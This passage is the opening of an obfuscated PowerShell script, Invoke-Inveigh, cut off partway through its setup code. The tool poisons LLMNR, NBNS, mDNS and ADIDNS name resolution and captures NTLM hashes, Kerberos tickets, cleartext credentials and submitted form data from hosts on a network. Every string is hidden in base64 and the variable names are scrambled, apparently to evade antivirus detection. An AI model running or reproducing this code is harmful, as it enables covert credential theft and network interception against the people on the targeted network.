function Invoke-Inveigh
{
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Array]$ADIDNSHostsIgnore = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGEAdABhAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBwAGEAZAA=')))),
    [parameter(Mandatory=$false)][Array]$KerberosHostHeader = "",
    [parameter(Mandatory=$false)][Array]$ProxyIgnore = "Firefox",
    [parameter(Mandatory=$false)][Array]$PcapTCP = ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAzADkA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NAA0ADUA')))),
    [parameter(Mandatory=$false)][Array]$PcapUDP = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferHostsIgnore = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsReply = "",
    [parameter(Mandatory=$false)][Array]$SpooferIPsIgnore = "",
    [parameter(Mandatory=$false)][Array]$WPADDirectHosts = "",
    [parameter(Mandatory=$false)][Array]$WPADAuthIgnore = "Firefox",
    [parameter(Mandatory=$false)][Int]$ConsoleQueueLimit = "-1",
    [parameter(Mandatory=$false)][Int]$ConsoleStatus = "",
    [parameter(Mandatory=$false)][Int]$ADIDNSThreshold = "4",
    [parameter(Mandatory=$false)][Int]$ADIDNSTTL = "600",
    [parameter(Mandatory=$false)][Int]$DNSTTL = "30",
    [parameter(Mandatory=$false)][Int]$HTTPPort = "80",
    [parameter(Mandatory=$false)][Int]$HTTPSPort = "443",
    [parameter(Mandatory=$false)][Int]$KerberosCount = "2",
    [parameter(Mandatory=$false)][Int]$LLMNRTTL = "30",
    [parameter(Mandatory=$false)][Int]$mDNSTTL = "120",
    [parameter(Mandatory=$false)][Int]$NBNSTTL = "165",
    [parameter(Mandatory=$false)][Int]$NBNSBruteForcePause = "",
    [parameter(Mandatory=$false)][Int]$ProxyPort = "8492",
    [parameter(Mandatory=$false)][Int]$RunCount = "",
    [parameter(Mandatory=$false)][Int]$RunTime = "",
    [parameter(Mandatory=$false)][Int]$WPADPort = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningDelay = "",
    [parameter(Mandatory=$false)][Int]$SpooferLearningInterval = "30",
    [parameter(Mandatory=$false)][Int]$SpooferThresholdHost = "0",
    [parameter(Mandatory=$false)][Int]$SpooferThresholdNetwork = "0",
    [parameter(Mandatory=$false)][String]$ADIDNSDomain = "",
    [parameter(Mandatory=$false)][String]$ADIDNSDomainController = "",
    [parameter(Mandatory=$false)][String]$ADIDNSForest = "",
    [parameter(Mandatory=$false)][String]$ADIDNSNS = "wpad",
    [parameter(Mandatory=$false)][String]$ADIDNSNSTarget = "wpad2",
    [parameter(Mandatory=$false)][String]$ADIDNSZone = "",
    [parameter(Mandatory=$false)][String]$HTTPBasicRealm = "ADFS",
    [parameter(Mandatory=$false)][String]$HTTPContentType = "text/html",
    [parameter(Mandatory=$false)][String]$HTTPDefaultFile = "",
    [parameter(Mandatory=$false)][String]$HTTPDefaultEXE = "",
    [parameter(Mandatory=$false)][String]$HTTPResponse = "",
    [parameter(Mandatory=$false)][String]$HTTPSCertIssuer = "Inveigh",
    [parameter(Mandatory=$false)][String]$HTTPSCertSubject = "localhost",
    [parameter(Mandatory=$false)][String]$NBNSBruteForceHost = "WPAD",
    [parameter(Mandatory=$false)][String]$WPADResponse = "function FindProxyForURL(url,host){return `"DIRECT`";}",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$Challenge = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ConsoleUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$ADIDNS,
    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$ADIDNSPartition = "DomainDNSZones",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSACE = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ADIDNSCleanup = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DNS = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$EvadeRG = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTP = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HTTPSForceCertDelete = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Kerberos = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LLMNR = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LogOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$MachineAccounts = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$mDNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNS = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NBNSBruteForce = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$OutputStreamOnly = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$Proxy = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShowHelp = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SMB = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferLearning = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferNonprintable = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SpooferRepeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StatusOutput = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$StartupChecks = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$ConsoleOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$Elevated = "Auto",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$HTTPAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$mDNSTypes = @("QU"),
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$NBNSTypes = @("00","20"),
    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$Pcap = "",
    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$ProxyAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$Tool = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$WPADAuth = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$KerberosHash,
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$HTTPDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$HTTPIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$IP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NBNSBruteForceTarget = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$ProxyIP = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SpooferIP = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$WPADIP = "",
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$ADIDNSCredential,
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$KerberosCredential,
    [parameter(Mandatory=$false)][Switch]$Inspect,
    [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
)
if($invalid_parameter)
{
    echo "[-] $($invalid_parameter) is not a valid parameter"
    throw
}
${00100000101110111} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAuADUAMAAyAA==')))
if(!$IP)
{ 
    try
    {
        $IP = (Test-Connection 127.0.0.1 -count 1 | select -ExpandProperty Ipv4Address)
    }
    catch
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABFAHIAcgBvAHIAIABmAGkAbgBkAGkAbgBnACAAbABvAGMAYQBsACAASQBQACwAIABzAHAAZQBjAGkAZgB5ACAAbQBhAG4AdQBhAGwAbAB5ACAAdwBpAHQAaAAgAC0ASQBQAA==')))
        throw
    }
}
if(!$SpooferIP)
{
    $SpooferIP = $IP
}
if($ADIDNS)
{
    if(!$ADIDNSDomainController -or !$ADIDNSDomain -or $ADIDNSForest -or !$ADIDNSZone)
    {
        try
        {
            ${01000000100110101} = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            echo "[-] $($_.Exception.Message)"
            throw
        }
        if(!$ADIDNSDomainController)
        {
            $ADIDNSDomainController = ${01000000100110101}.PdcRoleOwner.Name
        }
        if(!$ADIDNSDomain)
        {
            $ADIDNSDomain = ${01000000100110101}.Name
        }
        if(!$ADIDNSForest)
        {
            $ADIDNSForest = ${01000000100110101}.Forest
        }
        if(!$ADIDNSZone)
        {
            $ADIDNSZone = ${01000000100110101}.Name
        }
    }
}
if($HTTPDefaultFile -or $HTTPDefaultEXE)
{
    if(!$HTTPDirectory)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABZAG8AdQAgAG0AdQBzAHQAIABzAHAAZQBjAGkAZgB5ACAAYQBuACAALQBIAFQAVABQAEQAaQByACAAdwBoAGUAbgAgAHUAcwBpAG4AZwAgAGUAaQB0AGgAZQByACAALQBIAFQAVABQAEQAZQBmAGEAdQBsAHQARgBpAGwAZQAgAG8AcgAgAC0ASABUAFQAUABEAGUAZgBhAHUAbAB0AEUAWABFAA==')))
        throw
    }
}
if($Kerberos -eq 'Y' -and !$KerberosCredential -and !$KerberosHash)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABZAG8AdQAgAG0AdQBzAHQAIABzAHAAZQBjAGkAZgB5ACAAYQAgAC0ASwBlAHIAYgBlAHIAbwBzAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABvAHIAIAAtAEsAZQByAGIAZQByAG8AcwBIAGEAcwBoACAAdwBoAGUAbgAgAGUAbgBhAGIAbABpAG4AZwAgAEsAZQByAGIAZQByAG8AcwAgAGMAYQBwAHQAdQByAGUA')))
    throw
}
if($WPADIP -or $WPADPort)
{
    if(!$WPADIP)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABZAG8AdQAgAG0AdQBzAHQAIABzAHAAZQBjAGkAZgB5ACAAYQAgAC0AVwBQAEEARABQAG8AcgB0ACAAdABvACAAZwBvACAAdwBpAHQAaAAgAC0AVwBQAEEARABJAFAA')))
        throw
    }
    if(!$WPADPort)
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABZAG8AdQAgAG0AdQBzAHQAIABzAHAAZQBjAGkAZgB5ACAAYQAgAC0AVwBQAEEARABJAFAAIAB0AG8AIABnAG8AIAB3AGkAdABoACAALQBXAFAAQQBEAFAAbwByAHQA')))
        throw
    }
}
if($NBNSBruteForce -eq 'Y' -and !$NBNSBruteForceTarget)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABZAG8AdQAgAG0AdQBzAHQAIABzAHAAZQBjAGkAZgB5ACAAYQAgAC0ATgBCAE4AUwBCAHIAdQB0AGUARgBvAHIAYwBlAFQAYQByAGcAZQB0ACAAaQBmACAAZQBuAGEAYgBsAGkAbgBnACAALQBOAEIATgBTAEIAcgB1AHQAZQBGAG8AcgBjAGUA')))
    throw
}
if(!$FileOutputDirectory)
{ 
    ${00110110010110001} = $PWD.Path
}
else
{
    ${00110110010110001} = $FileOutputDirectory
}
if(!${00101000010000101})
{
    ${global:00101000010000101} = [HashTable]::Synchronized(@{})
    ${00101000010000101}.cleartext_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.enumerate = New-Object System.Collections.ArrayList
    ${00101000010000101}.IP_capture_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.log = New-Object System.Collections.ArrayList
    ${00101000010000101}.kerberos_TGT_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv1_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv1_username_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv2_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv2_username_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.POST_request_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.valid_host_list = New-Object System.Collections.ArrayList
    ${00101000010000101}.ADIDNS_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.relay_privilege_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.relay_failed_login_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.relay_history_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.request_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.session_socket_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.session_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.session_message_ID_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.session_lock_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.SMB_session_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.domain_mapping_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.group_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.session_count = 0
    ${00101000010000101}.session = @()
}
if(${00101000010000101}.running)
{
    echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABJAG4AdgBlAGkAZwBoACAAaQBzACAAYQBsAHIAZQBhAGQAeQAgAHIAdQBuAG4AaQBuAGcA')))
    throw
}
${00101000010000101}.stop = $false
if(!${00101000010000101}.relay_running)
{
    ${00101000010000101}.cleartext_file_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.console_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.log_file_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.output_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.POST_request_file_queue = New-Object System.Collections.ArrayList
    ${00101000010000101}.HTTP_session_table = [HashTable]::Synchronized(@{})
    ${00101000010000101}.console_input = $true
    ${00101000010000101}.console_output = $false
    ${00101000010000101}.file_output = $false
    ${00101000010000101}.HTTPS_existing_certificate = $false
    ${00101000010000101}.HTTPS_force_certificate_delete = $false
    ${00101000010000101}.log_output = $true
    ${00101000010000101}.cleartext_out_file = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0AQwBsAGUAYQByAHQAZQB4AHQALgB0AHgAdAA=')))
    ${00101000010000101}.log_out_file = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATABvAGcALgB0AHgAdAA=')))
    ${00101000010000101}.NTLMv1_out_file = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADEALgB0AHgAdAA=')))
    ${00101000010000101}.NTLMv2_out_file = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADIALgB0AHgAdAA=')))
    ${00101000010000101}.POST_request_out_file = ${00110110010110001} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ARgBvAHIAbQBJAG4AcAB1AHQALgB0AHgAdAA=')))
}
if($Elevated -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA='))))
{
    ${00010001111001000} = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))))
}
else
{
    if($Elevated -eq 'Y')
    {
        ${00010011101000110} = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA'))))
        ${00010001111001000} = $true
    }
    else
    {
        ${00010001111001000} = $false
    }
}
if($StartupChecks -eq 'Y')
{
    ${10100111011001010} = netsh advfirewall show allprofiles state | ? {$_ -match 'ON'}
    if($HTTP -eq 'Y')
    {
        ${00001101001011100} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPPort "
    }
    if($HTTPS -eq 'Y')
    {
        ${00011011101001010} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$HTTPSPort "
    }
    if($Proxy -eq 'Y')
    {
        ${10100000111100111} = netstat -anp TCP | findstr LISTENING | findstr /C:"$HTTPIP`:$ProxyPort "
    }
    if($DNS -eq 'Y' -and !${00010001111001000})
    {
        ${01111000110100000} = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
        ${01111000110100000} = $false
    }
    if($LLMNR -eq 'Y' -and !${00010001111001000})
    {
        ${01011110010011110} = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
        ${01011110010011110} = $false
    }
    if($mDNS -eq 'Y' -and !${00010001111001000})
    {
        ${01111011010001010} = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
    }
}
if(!${00010001111001000})
{
    if($HTTPS -eq 'Y')
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABIAFQAVABQAFMAIAByAGUAcQB1AGkAcgBlAHMAIABlAGwAZQB2AGEAdABlAGQAIABwAHIAaQB2AGkAbABlAGcAZQBzAA==')))
        throw
    }
    if($SpooferLearning -eq 'Y')
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABTAHAAbwBvAGYAZQByAEwAZQBhAHIAbgBpAG4AZwAgAHIAZQBxAHUAaQByAGUAcwAgAGUAbABlAHYAYQB0AGUAZAAgAHAAcgBpAHYAaQBsAGUAZwBlAHMA')))
        throw
    }
    if($Pcap -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQA='))))
    {
        echo $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABQAGMAYQBwACAAZgBpAGwAZQAgAG8AdQB0AHAAdQB0ACAAcgBlAHEAdQBpAHIAZQBzACAAZQBsAGUAdgBhAHQAZQBkACAAcAByAGkAdgBpAGwAZQBnAGUAcwA=')))
        throw
    }
    if(!$PSBoundParameters.ContainsKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBCAE4AUwA=')))))
    {
        $NBNS = "Y"
    }
    $SMB = "N"
}
${00101000010000101}.hostname_spoof = $false
${00101000010000101}.running = $true
if($StatusOutput -eq 'Y')
{
    ${00101000010000101}.status_output = $true
}
else
{
    ${00101000010000101}.status_output = $false
}
if($OutputStreamOnly -eq 'Y')
{
    ${00101000010000101}.output_stream_only = $true
}
else
{
    ${00101000010000101}.output_stream_only = $false
}
if($Inspect)
{
    if(${00010001111001000})
    {
        $DNS = "N"
        $LLMNR = "N"
        $mDNS = "N"
        $NBNS = "N"
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
    else
    {
        $HTTP = "N"
        $HTTPS = "N"
        $Proxy = "N"
    }
}
if($Tool -eq 1) 
{
    ${00101000010000101}.tool = 1
    ${00101000010000101}.output_stream_only = $true
    ${00101000010000101}.newline = $null
    $ConsoleOutput = "N"
}
elseif($Tool -eq 2) 
{
    ${00101000010000101}.tool = 2
    ${00101000010000101}.output_stream_only = $true
    ${00101000010000101}.console_input = $false
    ${00101000010000101}.newline = $null
    $LogOutput = "N"
    $ShowHelp = "N"
    switch ($ConsoleOutput)
    {
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        {
            $ConsoleOutput = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAHcA')))
        }
        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        {
            $ConsoleOutput = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAGQAaQB1AG0A')))
        }
        default
        {
            $ConsoleOutput = "Y"
        }
    }
}
else
{
    ${00101000010000101}.tool = 0
    ${00101000010000101}.newline = $null
}
${00101000010000101}.netBIOS_domain = (ls -path env:userdomain).Value
${00101000010000101}.computer_name = (ls -path env:computername).Value
try
{
    ${00101000010000101}.DNS_domain = ((ls -path env:userdnsdomain -ErrorAction $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))).Value).ToLower()
    ${00101000010000101}.DNS_computer_name = (${00101000010000101}.computer_name + "." + ${00101000010000101}.DNS_domain).ToLower()
    if(!${00101000010000101}.domain_mapping_table.(${00101000010000101}.netBIOS_domain))
    {
        ${00101000010000101}.domain_mapping_table.Add(${00101000010000101}.netBIOS_domain,${00101000010000101}.DNS_domain)
    }
}
catch
{
    ${00101000010000101}.DNS_domain = ${00101000010000101}.netBIOS_domain
    ${00101000010000101}.DNS_computer_name = ${00101000010000101}.computer_name
}
${00101000010000101}.output_queue.Add("[*] Inveigh ${00100000101110111} started at $(Get-Date -format s)") > $null
if($Elevated -eq 'Y' -or ${00010001111001000})
{
    if(($Elevated -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwA='))) -and ${00010001111001000}) -or ($Elevated -eq 'Y' -and ${00010011101000110}))
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABFAGwAZQB2AGEAdABlAGQAIABQAHIAaQB2AGkAbABlAGcAZQAgAE0AbwBkAGUAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
    }
    else
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAtAF0AIABFAGwAZQB2AGEAdABlAGQAIABQAHIAaQB2AGkAbABlAGcAZQAgAE0AbwBkAGUAIABFAG4AYQBiAGwAZQBkACAAQgB1AHQAIABDAGgAZQBjAGsAIABGAGEAaQBsAGUAZAA='))))  > $null
    }
}
else
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABFAGwAZQB2AGEAdABlAGQAIABQAHIAaQB2AGkAbABlAGcAZQAgAE0AbwBkAGUAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null
    $SMB = "N"
}
if(${10100111011001010})
{
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwAhAF0AIABXAGkAbgBkAG8AdwBzACAARgBpAHIAZQB3AGEAbABsACAAPQAgAEUAbgBhAGIAbABlAGQA'))))  > $null
}
${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABQAHIAaQBtAGEAcgB5ACAASQBQACAAQQBkAGQAcgBlAHMAcwAgAD0AIAAkAEkAUAA='))))  > $null
if($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
{
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAASQBQACAAQQBkAGQAcgBlAHMAcwAgAD0AIAAkAFMAcABvAG8AZgBlAHIASQBQAA=='))))  > $null
}
if($LLMNR -eq 'Y' -or $NBNS -eq 'Y')
{
    if($SpooferThresholdHost -gt 0)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAAVABoAHIAZQBzAGgAbwBsAGQAIABIAG8AcwB0ACAAPQAgACQAUwBwAG8AbwBmAGUAcgBUAGgAcgBlAHMAaABvAGwAZABIAG8AcwB0AA=='))))  > $null
    }
    if($SpooferThresholdNetwork -gt 0)
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABTAHAAbwBvAGYAZQByACAAVABoAHIAZQBzAGgAbwBsAGQAIABOAGUAdAB3AG8AcgBrACAAPQAgACQAUwBwAG8AbwBmAGUAcgBUAGgAcgBlAHMAaABvAGwAZABOAGUAdAB3AG8AcgBrAA=='))))  > $null
    }
}
if($ADIDNS)
{
    ${00101000010000101}.ADIDNS = $ADIDNS
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAFMAcABvAG8AZgBlAHIAIAA9ACAAJABBAEQASQBEAE4AUwA='))))  > $null
    ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEgAbwBzAHQAcwAgAEkAZwBuAG8AcgBlACAAPQAgAA=='))) + ($ADIDNSHostsIgnore -join ","))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgAgAD0AIAAkAEEARABJAEQATgBTAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIA'))))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEQAbwBtAGEAaQBuACAAPQAgACQAQQBEAEkARABOAFMARABvAG0AYQBpAG4A'))))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEYAbwByAGUAcwB0ACAAPQAgACQAQQBEAEkARABOAFMARgBvAHIAZQBzAHQA'))))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAFQAVABMACAAPQAgACQAQQBEAEkARABOAFMAVABUAEwA'))))  > $null
    ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAFoAbwBuAGUAIAA9ACAAJABBAEQASQBEAE4AUwBaAG8AbgBlAA=='))))  > $null
    if(${00101000010000101}.ADIDNS -contains 'NS')
    {
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAE4AUwAgAFIAZQBjAG8AcgBkACAAPQAgACQAQQBEAEkARABOAFMATgBTAA=='))))  > $null
        ${00101000010000101}.output_queue.Add($ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAE4AUwAgAFQAYQByAGcAZQB0ACAAUgBlAGMAbwByAGQAIAA9ACAAJABBAEQASQBEAE4AUwBOAFMAVABhAHIAZwBlAHQA'))))  > $null
    }
    if($ADIDNSACE -eq 'Y')
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEEAQwBFACAAQQBkAGQAIAA9ACAARQBuAGEAYgBsAGUAZAA='))))  > $null
    }
    else
    {
        ${00101000010000101}.output_queue.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwArAF0AIABBAEQASQBEAE4AUwAgAEEAQwBFACAAQQBkAGQAIAA9ACAARABpAHMAYQBiAGwAZQBkAA=='))))  > $null    
    }
    if($ADIDNSCleanup -eq 'Y')
    {
